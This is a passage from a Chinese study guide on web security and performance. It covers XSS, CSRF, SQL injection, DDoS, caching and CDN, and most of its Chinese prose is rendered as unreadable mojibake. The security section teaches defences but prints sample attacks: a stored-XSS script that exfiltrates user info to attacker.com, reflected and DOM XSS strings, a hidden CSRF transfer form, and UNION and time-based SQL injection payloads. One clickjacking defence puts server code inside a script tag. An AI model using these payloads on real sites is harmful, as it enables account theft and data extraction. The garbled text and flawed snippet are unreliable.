1. **é€‰æ‹©é¢˜**ï¼šSessionå’ŒCookieçš„ä¸»è¦åŒºåˆ«æ˜¯ï¼Ÿ
   - A. å­˜å‚¨ä½ç½®  B. å®‰å…¨æ€§  C. ç”Ÿå‘½å‘¨æœŸ  D. ä»¥ä¸Šéƒ½æ˜¯
   - **ç­”æ¡ˆ**ï¼šD

2. **ç®€ç­”é¢˜**ï¼šJWTçš„ç»„æˆéƒ¨åˆ†å’Œä½œç”¨
   - **è¦ç‚¹**ï¼šHeaderï¼ˆç®—æ³•ä¿¡æ¯ï¼‰ã€Payloadï¼ˆç”¨æˆ·ä¿¡æ¯ï¼‰ã€Signatureï¼ˆç­¾åéªŒè¯ï¼‰

3. **è®¾è®¡é¢˜**ï¼šä¸ºç§»åŠ¨APPè®¾è®¡ç”¨æˆ·è®¤è¯æ–¹æ¡ˆ
   - **è¦ç‚¹**ï¼šä½¿ç”¨JWT Tokenï¼Œè€ƒè™‘åˆ·æ–°æœºåˆ¶ï¼Œå®‰å…¨å­˜å‚¨

### âš ï¸ æ˜“é”™ç‚¹

- **Cookieä½œç”¨åŸŸ**ï¼šDomainå’ŒPathè®¾ç½®é”™è¯¯ä¼šå¯¼è‡´Cookieæ— æ³•å‘é€
- **Sessionå­˜å‚¨**ï¼šå¤šæœåŠ¡å™¨éƒ¨ç½²éœ€è¦å…±äº«Sessionå­˜å‚¨
- **JWTå®‰å…¨**ï¼šPayloadæ˜¯å¯è§£ç çš„ï¼Œä¸è¦å­˜æ”¾æ•æ„Ÿä¿¡æ¯
- **Tokenè¿‡æœŸ**ï¼šéœ€è¦å‰ç«¯å¤„ç†Tokenè¿‡æœŸçš„æƒ…å†µ

---

## 9ï¸âƒ£ å¸¸è§ç½‘ç»œæ”»å‡»ä¸é˜²æŠ¤

### ğŸ¯ æ ¸å¿ƒæ¦‚å¿µ

äº†è§£å¸¸è§çš„**ç½‘ç»œå®‰å…¨å¨èƒ**å’Œç›¸åº”çš„**é˜²æŠ¤æªæ–½**ï¼Œæ˜¯å¼€å‘å®‰å…¨Webåº”ç”¨çš„åŸºç¡€è¦æ±‚ã€‚

### ğŸ“– è¯¦ç»†è§£æ

#### XSSï¼ˆè·¨ç«™è„šæœ¬æ”»å‡»ï¼‰

**æ”»å‡»åŸç†**ï¼š
```
æ”»å‡»è€…å°†æ¶æ„è„šæœ¬æ³¨å…¥ç½‘é¡µï¼Œå½“å…¶ä»–ç”¨æˆ·è®¿é—®æ—¶æ‰§è¡Œè„šæœ¬
```

**XSSç±»å‹**ï¼š

**1. åå°„å‹XSSï¼ˆéæŒä¹…å‹ï¼‰**ï¼š
```html
<!-- å±é™©çš„æœç´¢é¡µé¢ -->
<p>æœç´¢ç»“æœï¼š<?php echo $_GET['keyword']; ?></p>

<!-- æ”»å‡»URL -->
https://example.com/search?keyword=<script>alert('XSS')</script>

<!-- å®é™…è¾“å‡º -->
<p>æœç´¢ç»“æœï¼š<script>alert('XSS')</script></p>
```

**2. å­˜å‚¨å‹XSSï¼ˆæŒä¹…å‹ï¼‰**ï¼š
```html
<!-- ç”¨æˆ·å‘è¡¨è¯„è®º -->
è¯„è®ºå†…å®¹ï¼š<script>
  fetch('/user/info').then(res => res.json()).then(data => {
    fetch('http://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });
</script>

<!-- å…¶ä»–ç”¨æˆ·æŸ¥çœ‹è¯„è®ºæ—¶æ‰§è¡Œæ¶æ„è„šæœ¬ -->
```

**3. DOMå‹XSS**ï¼š
```javascript
// å±é™©ä»£ç 
const userInput = window.location.hash.substring(1);
document.getElementById('content').innerHTML = userInput;

// æ”»å‡»URL
https://example.com/#<img src=x onerror=alert('XSS')>
```

**XSSé˜²æŠ¤æªæ–½**ï¼š

**1. è¾“å…¥éªŒè¯å’Œè¿‡æ»¤**ï¼š
```javascript
// ç™½åå•è¿‡æ»¤
function sanitizeInput(input) {
  const allowedTags = ['b', 'i', 'u', 'strong', 'em'];
  // ä½¿ç”¨DOMPurifyç­‰åº“è¿›è¡Œæ¸…ç†
  return DOMPurify.sanitize(input, {
    ALLOWED_TAGS: allowedTags
  });
}
```

**2. è¾“å‡ºç¼–ç **ï¼š
```javascript
// HTMLå®ä½“ç¼–ç 
function htmlEncode(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

// ä½¿ç”¨æ¨¡æ¿å¼•æ“è‡ªåŠ¨ç¼–ç 
// React: {userInput} è‡ªåŠ¨ç¼–ç 
// Vue: {{userInput}} è‡ªåŠ¨ç¼–ç 
```

**3. CSPï¼ˆå†…å®¹å®‰å…¨ç­–ç•¥ï¼‰**ï¼š
```html
<!-- ç¦æ­¢å†…è”è„šæœ¬ -->
<meta http-equiv="Content-Security-Policy"
      content="script-src 'self' https://trusted-cdn.com;">

<!-- æˆ–åœ¨HTTPå¤´ä¸­è®¾ç½® -->
Content-Security-Policy: script-src 'self' https://trusted-cdn.com;
```

#### CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰

**æ”»å‡»åŸç†**ï¼š
```
æ”»å‡»è€…è¯±å¯¼ç”¨æˆ·åœ¨å·²ç™»å½•çš„ç½‘ç«™ä¸Šæ‰§è¡Œéé¢„æœŸçš„æ“ä½œ
```

**æ”»å‡»åœºæ™¯**ï¼š
```html
<!-- ç”¨æˆ·å·²ç™»å½•é“¶è¡Œç½‘ç«™ -->
<!-- æ”»å‡»è€…ç½‘ç«™åŒ…å«ä»¥ä¸‹ä»£ç  -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" style="display:none;">

<!-- æˆ–è€…ä½¿ç”¨è¡¨å•è‡ªåŠ¨æäº¤ -->
<form action="https://bank.com/transfer" method="POST" id="hack">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('hack').submit();</script>
```

**CSRFé˜²æŠ¤æªæ–½**ï¼š

**1. CSRF Token**ï¼š
```javascript
// æœåŠ¡å™¨ç”ŸæˆCSRF Token
app.use((req, res, next) => {
  if (!req.session.csrfToken) {
    req.session.csrfToken = generateRandomToken();
  }
  res.locals.csrfToken = req.session.csrfToken;
  next();
});

// è¡¨å•ä¸­åŒ…å«CSRF Token
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="<%= csrfToken %>">
  <input type="text" name="to">
  <input type="number" name="amount">
  <button type="submit">è½¬è´¦</button>
</form>

// æœåŠ¡å™¨éªŒè¯Token
app.post('/transfer', (req, res) => {
  if (req.body.csrf_token !== req.session.csrfToken) {
    return res.status(403).json({ error: 'CSRF Tokenæ— æ•ˆ' });
  }
  // æ‰§è¡Œè½¬è´¦æ“ä½œ
});
```

**2. SameSite Cookie**ï¼š
```javascript
app.use(session({
  cookie: {
    sameSite: 'strict', // æˆ– 'lax'
    httpOnly: true,
    secure: true
  }
}));
```

**3. éªŒè¯Refererå¤´**ï¼š
```javascript
app.use((req, res, next) => {
  const referer = req.get('Referer');
  if (referer && !referer.startsWith('https://trusted-domain.com')) {
    return res.status(403).json({ error: 'è¯·æ±‚æ¥æºä¸å¯ä¿¡' });
  }
  next();
});
```

#### SQLæ³¨å…¥

**æ”»å‡»åŸç†**ï¼š
```sql
-- æ­£å¸¸æŸ¥è¯¢
SELECT * FROM users WHERE username = 'admin' AND password = 'password';

-- æ³¨å…¥æ”»å‡»
ç”¨æˆ·å: admin' OR '1'='1' --
å¯†ç : ä»»æ„

-- å®é™…æ‰§è¡Œçš„SQL
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = 'xxx';
-- ç”±äº'1'='1'æ°¸è¿œä¸ºçœŸï¼ŒæŸ¥è¯¢è¿”å›æ‰€æœ‰ç”¨æˆ·
```

**å¸¸è§SQLæ³¨å…¥ç±»å‹**ï¼š

**1. è”åˆæŸ¥è¯¢æ³¨å…¥**ï¼š
```sql
-- è·å–æ•°æ®åº“ä¿¡æ¯
' UNION SELECT database(), user(), version() --

-- è·å–è¡¨ç»“æ„
' UNION SELECT table_name, column_name FROM information_schema.columns --
```

**2. å¸ƒå°”ç›²æ³¨**ï¼š
```sql
-- åˆ¤æ–­æ•°æ®åº“é•¿åº¦
' AND LENGTH(database()) > 5 --
```

**3. æ—¶é—´ç›²æ³¨**ï¼š
```sql
-- å»¶æ—¶åˆ¤æ–­
' AND IF(LENGTH(database()) > 5, SLEEP(5), 0) --
```

**SQLæ³¨å…¥é˜²æŠ¤**ï¼š

**1. å‚æ•°åŒ–æŸ¥è¯¢ï¼ˆæœ€é‡è¦ï¼‰**ï¼š
```javascript
// å±é™©åšæ³•
const query = `SELECT * FROM users WHERE username = '${username}'`;

// å®‰å…¨åšæ³•
const query = 'SELECT * FROM users WHERE username = ?';
db.query(query, [username], (err, results) => {
  // å¤„ç†ç»“æœ
});

// ORMç¤ºä¾‹ï¼ˆSequelizeï¼‰
User.findOne({
  where: {
    username: username  // è‡ªåŠ¨é˜²SQLæ³¨å…¥
  }
});
```

**2. è¾“å…¥éªŒè¯**ï¼š
```javascript
function validateInput(input) {
  // æ£€æŸ¥é•¿åº¦
  if (input.length > 100) return false;

  // æ£€æŸ¥å­—ç¬¦é›†ï¼ˆç™½åå•ï¼‰
  const pattern = /^[a-zA-Z0-9_@.-]+$/;
  return pattern.test(input);
}
```

**3. æœ€å°æƒé™åŸåˆ™**ï¼š
```sql
-- ä¸ºåº”ç”¨åˆ›å»ºä¸“ç”¨æ•°æ®åº“ç”¨æˆ·
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'strong_password';

-- åªæˆäºˆå¿…è¦æƒé™
GRANT SELECT, INSERT, UPDATE ON app_db.* TO 'app_user'@'localhost';

-- ä¸è¦ä½¿ç”¨rootç”¨æˆ·è¿æ¥
```

#### DDoSï¼ˆåˆ†å¸ƒå¼æ‹’ç»æœåŠ¡æ”»å‡»ï¼‰

**æ”»å‡»ç±»å‹**ï¼š

**1. æµé‡æ”»å‡»**ï¼š
```
å¤§é‡è¯·æ±‚å æ»¡æœåŠ¡å™¨å¸¦å®½
ä¾‹ï¼šUDPæ´ªæ°´ã€ICMPæ´ªæ°´
```

**2. è¿æ¥æ”»å‡»**ï¼š
```
å æ»¡æœåŠ¡å™¨è¿æ¥æ•°
ä¾‹ï¼šSYNæ´ªæ°´æ”»å‡»
```

**3. åº”ç”¨å±‚æ”»å‡»**ï¼š
```
é’ˆå¯¹ç‰¹å®šåº”ç”¨çš„æ”»å‡»
ä¾‹ï¼šHTTPæ…¢é€Ÿæ”»å‡»ã€CCæ”»å‡»
```

**DDoSé˜²æŠ¤æªæ–½**ï¼š

**1. æµé‡æ¸…æ´—**ï¼š
```javascript
// ä½¿ç”¨CDNå’Œé˜²ç«å¢™è¿‡æ»¤æ¶æ„æµé‡
// Cloudflare, AWS Shieldç­‰æœåŠ¡
```

**2. é™æµ**ï¼š
```javascript
// åŸºäºIPçš„é™æµ
const rateLimit = require('express-rate-limit');

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15åˆ†é’Ÿ
  max: 100, // æœ€å¤š100ä¸ªè¯·æ±‚
  message: 'è¯·æ±‚è¿‡äºé¢‘ç¹ï¼Œè¯·ç¨åå†è¯•'
});

app.use('/api/', limiter);
```

**3. è´Ÿè½½å‡è¡¡**ï¼š
```
åˆ†æ•£æµé‡åˆ°å¤šä¸ªæœåŠ¡å™¨
ä½¿ç”¨Nginxã€HAProxyç­‰
```

#### å…¶ä»–å¸¸è§æ”»å‡»

**ç‚¹å‡»åŠ«æŒï¼ˆClickjackingï¼‰**ï¼š
```html
<!-- é˜²æŠ¤ï¼šX-Frame-Optionså¤´ -->
<script>
app.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'DENY');
  next();
});
</script>
```

**ä¼šè¯åŠ«æŒ**ï¼š
```javascript
// é˜²æŠ¤æªæ–½
app.use(session({
  cookie: {
    httpOnly: true,    // é˜²æ­¢JSè®¿é—®
    secure: true,      // HTTPSä¼ è¾“
    maxAge: 30 * 60 * 1000  // 30åˆ†é’Ÿè¿‡æœŸ
  },
  rolling: true        // æ¯æ¬¡è¯·æ±‚é‡ç½®è¿‡æœŸæ—¶é—´
}));
```

### ğŸ’¡ è®°å¿†æŠ€å·§

**æ”»å‡»ç±»å‹è®°å¿†**ï¼š**"è·¨è„šè·¨è¯·SQLæ‹’"**
- **XSS**ï¼š**è·¨ç«™è„šæœ¬** â†’ æ³¨å…¥è„šæœ¬
- **CSRF**ï¼š**è·¨ç«™è¯·æ±‚** â†’ ä¼ªé€ è¯·æ±‚
- **SQLæ³¨å…¥**ï¼š**SQLè¯­å¥** â†’ æ¶æ„SQL
- **DDoS**ï¼š**æ‹’ç»æœåŠ¡** â†’ è€—å°½èµ„æº

**é˜²æŠ¤åŸåˆ™è®°å¿†**ï¼š**"è¾“å‡ºéªŒè¯æœ€å°æƒé™"**
- **è¾“å…¥éªŒè¯**ï¼šä¸ä¿¡ä»»ä»»ä½•è¾“å…¥
- **è¾“å‡ºç¼–ç **ï¼šç¼–ç æ˜¾ç¤ºå†…å®¹
- **éªŒè¯æˆæƒ**ï¼šæ£€æŸ¥ç”¨æˆ·æƒé™
- **æœ€å°æƒé™**ï¼šç»™äºˆæœ€å°å¿…è¦æƒé™

### â“ å…¸å‹è€ƒé¢˜

1. **é€‰æ‹©é¢˜**ï¼šé˜²æ­¢XSSæ”»å‡»æœ€æœ‰æ•ˆçš„æ–¹æ³•æ˜¯ï¼Ÿ
   - A. è¾“å…¥é•¿åº¦é™åˆ¶  B. è¾“å‡ºHTMLç¼–ç   C. ä½¿ç”¨HTTPS  D. è®¾ç½®å¼ºå¯†ç 
   - **ç­”æ¡ˆ**ï¼šB

2. **ç®€ç­”é¢˜**ï¼šCSRFæ”»å‡»çš„åŸç†å’Œé˜²æŠ¤æ–¹æ³•
   - **è¦ç‚¹**ï¼šåˆ©ç”¨ç”¨æˆ·å·²ç™»å½•çŠ¶æ€ï¼Œé˜²æŠ¤ç”¨CSRF Tokenã€SameSite Cookie

3. **åˆ†æé¢˜**ï¼šSQLæ³¨å…¥æ”»å‡»ä¸ºä»€ä¹ˆå±é™©ï¼Ÿå¦‚ä½•é˜²æŠ¤ï¼Ÿ
   - **è¦ç‚¹**ï¼šå¯è·å–æ•æ„Ÿæ•°æ®ã€ç ´åæ•°æ®ï¼Œä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢é˜²æŠ¤

### âš ï¸ æ˜“é”™ç‚¹

- **XSSé˜²æŠ¤**ï¼šä¸èƒ½åªè¿‡æ»¤`<script>`æ ‡ç­¾ï¼Œè¦è¿›è¡Œå®Œæ•´çš„HTMLç¼–ç 
- **CSRF Token**ï¼šè¦åœ¨æ¯ä¸ªçŠ¶æ€æ”¹å˜çš„è¯·æ±‚ä¸­éªŒè¯ï¼ŒåŒ…æ‹¬AJAX
- **SQLæ³¨å…¥**ï¼šORMä¸æ˜¯ä¸‡èƒ½çš„ï¼Œå¤æ‚æŸ¥è¯¢ä»å¯èƒ½æœ‰æ³¨å…¥é£é™©
- **é˜²æŠ¤å±‚æ¬¡**ï¼šè¦åœ¨å¤šä¸ªå±‚é¢é˜²æŠ¤ï¼Œä¸èƒ½ä¾èµ–å•ä¸€é˜²æŠ¤æªæ–½

---

## ğŸ”Ÿ ç½‘ç»œæ€§èƒ½ä¼˜åŒ–

### ğŸ¯ æ ¸å¿ƒæ¦‚å¿µ

ç½‘ç»œæ€§èƒ½ä¼˜åŒ–æ˜¯æå‡ç”¨æˆ·ä½“éªŒçš„å…³é”®ï¼Œä¸»è¦é€šè¿‡**å‡å°‘è¯·æ±‚æ¬¡æ•°ã€é™ä½ä¼ è¾“å¤§å°ã€æé«˜ä¼ è¾“æ•ˆç‡**æ¥å®ç°ã€‚

### ğŸ“– è¯¦ç»†è§£æ

#### æ€§èƒ½æŒ‡æ ‡ä¸æµ‹é‡

**å…³é”®æ€§èƒ½æŒ‡æ ‡**ï¼š
```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚      æŒ‡æ ‡        â”‚       å«ä¹‰        â”‚     ç›®æ ‡å€¼       â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ FCP             â”‚ é¦–æ¬¡å†…å®¹ç»˜åˆ¶      â”‚ < 1.8ç§’         â”‚
â”‚ LCP             â”‚ æœ€å¤§å†…å®¹ç»˜åˆ¶      â”‚ < 2.5ç§’         â”‚
â”‚ FID             â”‚ é¦–æ¬¡è¾“å…¥å»¶è¿Ÿ      â”‚ < 100ms         â”‚
â”‚ CLS             â”‚ ç´¯ç§¯å¸ƒå±€åç§»      â”‚ < 0.1           â”‚
â”‚ TTFB            â”‚ é¦–å­—èŠ‚æ—¶é—´        â”‚ < 600ms         â”‚
â”‚ Speed Index     â”‚ é€Ÿåº¦æŒ‡æ•°          â”‚ < 3.4ç§’         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**æµ‹é‡å·¥å…·**ï¼š
```javascript
// Performance API
performance.mark('start');
// æ‰§è¡Œæ“ä½œ
performance.mark('end');
performance.measure('operation', 'start', 'end');

// Navigation Timing
const timing = performance.getEntriesByType('navigation')[0];
const ttfb = timing.responseStart - timing.requestStart;
const domLoad = timing.domContentLoadedEventEnd - timing.navigationStart;

console.log(`TTFB: ${ttfb}ms, DOMåŠ è½½: ${domLoad}ms`);
```

#### CDNï¼ˆå†…å®¹åˆ†å‘ç½‘ç»œï¼‰

**CDNå·¥ä½œåŸç†**ï¼š
```
ç”¨æˆ·è¯·æ±‚ â†’ DNSè§£æ â†’ å°±è¿‘CDNèŠ‚ç‚¹ â†’ ç¼“å­˜å‘½ä¸­ï¼Ÿ
                                    â†“
                            Yes: ç›´æ¥è¿”å›ç¼“å­˜å†…å®¹
                            No:  å›æºè·å– â†’ ç¼“å­˜ â†’ è¿”å›
```

**CDNä¼˜åŠ¿**ï¼š
```
âœ… å‡å°‘å»¶è¿Ÿï¼šå°±è¿‘è®¿é—®ï¼Œå‡å°‘ç½‘ç»œè·³è·ƒ
âœ… å‡è½»æºç«™å‹åŠ›ï¼šåˆ†æ•£æµé‡
âœ… æé«˜å¯ç”¨æ€§ï¼šå¤šèŠ‚ç‚¹å®¹ç¾
âœ… é˜²æŠ¤æ”»å‡»ï¼šåˆ†æ•£DDoSæ”»å‡»
```

**CDNé…ç½®ç¤ºä¾‹**ï¼š
```javascript
// é™æ€èµ„æºä½¿ç”¨CDN
const cdnBase = 'https://cdn.example.com';

// HTMLä¸­å¼•ç”¨
<link rel="stylesheet" href="${cdnBase}/css/style.css">
<script src="${cdnBase}/js/app.js"></script>
<img src="${cdnBase}/images/logo.png" alt="Logo">

// ç¼“å­˜æ§åˆ¶
Cache-Control: public, max-age=31536000  // 1å¹´ç¼“å­˜
ETag: "abc123def456"  // ç‰ˆæœ¬æ ‡è¯†
```

#### HTTPç¼“å­˜ä¼˜åŒ–

**ç¼“å­˜ç­–ç•¥å±‚æ¬¡**ï¼š
```
æµè§ˆå™¨ç¼“å­˜
    â†“
CDNç¼“å­˜
    â†“
åå‘ä»£ç†ç¼“å­˜ï¼ˆNginxï¼‰
    â†“
åº”ç”¨ç¼“å­˜ï¼ˆRedisï¼‰
    â†“
æ•°æ®åº“ç¼“å­˜
```

**HTTPç¼“å­˜å¤´**ï¼š
```http
# å¼ºç¼“å­˜ï¼ˆä¸å‘æœåŠ¡å™¨å‘è¯·æ±‚ï¼‰
Cache-Control: max-age=3600          # ç¼“å­˜1å°æ—¶
Cache-Control: public, max-age=86400 # å…¬å¼€ç¼“å­˜1å¤©
Expires: Wed, 21 Oct 2025 07:28:00 GMT  # ç»å¯¹è¿‡æœŸæ—¶é—´

# åå•†ç¼“å­˜ï¼ˆå‘æœåŠ¡å™¨éªŒè¯ï¼‰
ETag: "abc123"                       # å†…å®¹æ ‡è¯†
Last-Modified: Wed, 21 Oct 2021 07:28:00 GMT  # æœ€åä¿®æ”¹æ—¶é—´

# ç¼“å­˜æ§åˆ¶
Cache-Control: no-cache              # æ¯æ¬¡éªŒè¯
Cache-Control: no-store              # ä¸ç¼“å­˜
Cache-Control: private               # åªèƒ½æµè§ˆå™¨ç¼“å­˜
```

**ç¼“å­˜ç­–ç•¥ç¤ºä¾‹**ï¼š
```javascript
// Express.jsç¼“å­˜ä¸­é—´ä»¶
app.use('/static', (req, res, next) => {
  // é™æ€èµ„æºé•¿æœŸç¼“å­˜
  res.setHeader('Cache-Control', 'public, max-age=31536000');
  res.setHeader('ETag', generateETag(req.path));
  next();
});

app.use('/api', (req, res, next) => {
  // APIæ¥å£çŸ­æœŸç¼“å­˜
  res.setHeader('Cache-Control', 'private, max-age=300');
  next();
});

// æ–‡ä»¶ç‰ˆæœ¬æ§åˆ¶
<link rel="stylesheet" href="/css/style.css?v=1.2.3">
<script src="/js/app.js?hash=abc123"></script>
```

#### ä»£ç ä¼˜åŒ–

**JavaScriptä¼˜åŒ–**ï¼š
```javascript
// 1. ä»£ç åˆ†å‰²ï¼ˆCode Splittingï¼‰
// åŠ¨æ€å¯¼å…¥
const LazyComponent = lazy(() => import('./LazyComponent'));

// WebpackåŠ¨æ€å¯¼å…¥
import('./heavyModule').then(module => {
  module.initialize();
});

// 2. Tree Shakingï¼ˆç§»é™¤æœªä½¿ç”¨ä»£ç ï¼‰
// webpack.config.js
module.exports = {
  mode: 'production',
  optimization: {
    usedExports: true,
    sideEffects: false
  }
};

// 3. å‹ç¼©æ··æ·†
// ä½¿ç”¨Terserã€UglifyJSç­‰å·¥å…·

// 4. é¿å…é‡å¤æ¸²æŸ“
const MemoizedComponent = React.memo(ExpensiveComponent);

// 5. è™šæ‹Ÿæ»šåŠ¨
// é•¿åˆ—è¡¨åªæ¸²æŸ“å¯è§éƒ¨åˆ†
```

**CSSä¼˜åŒ–**ï¼š
```css
/* 1. CSSå‹ç¼© */
/* ç§»é™¤ç©ºæ ¼ã€æ³¨é‡Šã€åˆå¹¶é€‰æ‹©å™¨ */

/* 2. å…³é”®CSSå†…è” */
<style>
  /* é¦–å±æ ·å¼å†…è”åˆ°HTMLä¸­ */
  .header { /* å…³é”®æ ·å¼ */ }
</style>

/* 3. é¿å…å¤æ‚é€‰æ‹©å™¨ */
/* é¿å… */
div > ul > li > a:hover { }

/* æ¨è */
.nav-link:hover { }

/* 4. ä½¿ç”¨CSS Sprites */
.icon { background: url('sprites.png') no-repeat; }
.icon-home { background-position: 0 0; }
.icon-user { background-position: -20px 0; }
```

**å›¾ç‰‡ä¼˜åŒ–**ï¼š
```html
<!-- 1. å“åº”å¼å›¾ç‰‡ -->
<picture>
  <source media="(min-width: 800px)" srcset="large.jpg">
  <source media="(min-width: 400px)" srcset="medium.jpg">
  <img src="small.jpg" alt="Responsive image">
</picture>

<!-- 2. æ‡’åŠ è½½ -->
<img src="placeholder.jpg" data-src="real-image.jpg" class="lazy" alt="Lazy loaded">

<script>
const observer = new IntersectionObserver(entries => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      const img = entry.target;
      img.src = img.dataset.src;
      img.classList.remove('lazy');
      observer.unobserve(img);
    }
  });
});

document.querySelectorAll('.lazy').forEach(img => observer.observe(img));
</script>

<!-- 3. WebPæ ¼å¼ -->
<picture>
  <source srcset="image.webp" type="image/webp">
  <img src="image.jpg" alt="Optimized image">
</picture>
```

#### ç½‘ç»œå±‚ä¼˜åŒ–

**HTTP/2ä¼˜åŒ–**ï¼š
```
âœ… å¤šè·¯å¤ç”¨ï¼šä¸€ä¸ªè¿æ¥å¹¶å‘å¤šä¸ªè¯·æ±‚
âœ… æœåŠ¡å™¨æ¨é€ï¼šä¸»åŠ¨æ¨é€èµ„æº
âœ… å¤´éƒ¨å‹ç¼©ï¼šHPACKç®—æ³•
âœ… äºŒè¿›åˆ¶åè®®ï¼šæé«˜è§£ææ•ˆç‡

HTTP/2æœ€ä½³å®è·µï¼š
- ä¸å†éœ€è¦åˆå¹¶CSS/JSæ–‡ä»¶
- å¯ä»¥å‘é€æ›´å¤šå°è¯·æ±‚
- åˆ©ç”¨æœåŠ¡å™¨æ¨é€é¢„åŠ è½½èµ„æº
```

**è¿æ¥ä¼˜åŒ–**ï¼š
```html
<!-- DNSé¢„è§£æ -->
<link rel="dns-prefetch" href="//cdn.example.com">

<!-- é¢„è¿æ¥ -->
<link rel="preconnect" href="https://fonts.googleapis.com">

<!-- èµ„æºé¢„åŠ è½½ -->
<link rel="preload" href="/css/critical.css" as="style">
<link rel="prefetch" href="/js/next-page.js" as="script">

<!-- æ¨¡å—é¢„åŠ è½½ -->
<link rel="modulepreload" href="/modules/app.js">
```

**å‹ç¼©ä¼˜åŒ–**ï¼š
```javascript
// Gzip/Brotliå‹ç¼©
// Nginxé…ç½®
gzip on;
gzip_comp_level 6;
gzip_types
  text/plain
  text/css
  text/xml
  text/javascript
  application/javascript
  application/json;

// Brotliå‹ç¼©ï¼ˆæ›´å¥½çš„å‹ç¼©ç‡ï¼‰
brotli on;
brotli_comp_level 6;
brotli_types text/plain text/css application/javascript;
```

#### ç›‘æ§ä¸åˆ†æ

**æ€§èƒ½ç›‘æ§**ï¼š
```javascript
// å®æ—¶æ€§èƒ½ç›‘æ§
class PerformanceMonitor {
  constructor() {
    this.metrics = {};
    this.init();
  }

  init() {
    // ç›‘æ§é¡µé¢åŠ è½½
    window.addEventListener('load', () => {
      this.collectMetrics();
    });

    // ç›‘æ§AJAXè¯·æ±‚
    this.interceptXHR();
  }

  collectMetrics() {
    const navigation = performance.getEntriesByType('navigation')[0];

    this.metrics = {
      ttfb: navigation.responseStart - navigation.requestStart,
      domLoad: navigation.domContentLoadedEventEnd - navigation.navigationStart,
      pageLoad: navigation.loadEventEnd - navigation.navigationStart,
      resources: performance.getEntriesByType('resource').length
    };

    this.sendMetrics();
  }

  interceptXHR() {
    const originalOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url) {
      this._startTime = Date.now();
      return originalOpen.apply(this, arguments);
    };

    const originalSend = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.send = function() {
      this.addEventListener('loadend', () => {
        const duration = Date.now() - this._startTime;
        console.log(`APIè¯·æ±‚è€—æ—¶: ${duration}ms`);
      });
      return originalSend.apply(this, arguments);
    };
  }

  sendMetrics() {
    fetch('/api/metrics', {
      method: 'POST',
      body: JSON.stringify(this.metrics)
    });
  }
}

new PerformanceMonitor();
```

### ğŸ’¡ è®°å¿†æŠ€å·§

**ä¼˜åŒ–ç­–ç•¥è®°å¿†**ï¼š**"å‡å°‘ç¼“å­˜å‹ç¼©åˆå¹¶"**
- **å‡å°‘**ï¼šå‡å°‘HTTPè¯·æ±‚æ¬¡æ•°
- **ç¼“å­˜**ï¼šåˆç†ä½¿ç”¨ç¼“å­˜ç­–ç•¥
- **å‹ç¼©**ï¼šGzip/Brotliå‹ç¼©
- **åˆå¹¶**ï¼šåˆå¹¶CSS/JSæ–‡ä»¶ï¼ˆHTTP/1.1ï¼‰

**ç¼“å­˜å±‚æ¬¡è®°å¿†**ï¼š**"æµCDNååº”æ•°"**
- **æµ**è§ˆå™¨ç¼“å­˜
- **CDN**ç¼“å­˜
- **å**å‘ä»£ç†ç¼“å­˜
- **åº”**ç”¨ç¼“å­˜
- **æ•°**æ®åº“ç¼“å­˜

**æ€§èƒ½æŒ‡æ ‡è®°å¿†**ï¼š**"é¦–æœ€è¾“å¸ƒå­—é€Ÿ"**
- **FCP**ï¼šé¦–æ¬¡å†…å®¹ç»˜åˆ¶
- **LCP**ï¼šæœ€å¤§å†…å®¹ç»˜åˆ¶
- **FID**ï¼šé¦–æ¬¡è¾“å…¥å»¶è¿Ÿ
- **CLS**ï¼šç´¯ç§¯å¸ƒå±€åç§»
- **TTFB**ï¼šé¦–å­—èŠ‚æ—¶é—´
- **SI**ï¼šé€Ÿåº¦æŒ‡æ•°

### â“ å…¸å‹è€ƒé¢˜

1. **é€‰æ‹©é¢˜**ï¼šCDNçš„ä¸»è¦ä½œç”¨æ˜¯ï¼Ÿ
   - A. æ•°æ®åŠ å¯†  B. å‡å°‘å»¶è¿Ÿ  C. é˜²æ­¢æ”»å‡»  D. å‹ç¼©æ•°æ®
   - **ç­”æ¡ˆ**ï¼šB

2. **ç®€ç­”é¢˜**ï¼šHTTPç¼“å­˜çš„ä¸¤ç§ç±»å‹åŠå…¶åŒºåˆ«
   - **è¦ç‚¹**ï¼šå¼ºç¼“å­˜ï¼ˆä¸å‘è¯·æ±‚ï¼‰ã€åå•†ç¼“å­˜ï¼ˆéªŒè¯åä½¿ç”¨ï¼‰

3. **åº”ç”¨é¢˜**ï¼šç½‘é¡µé¦–å±åŠ è½½æ…¢ï¼Œå¦‚ä½•ä¼˜åŒ–ï¼Ÿ
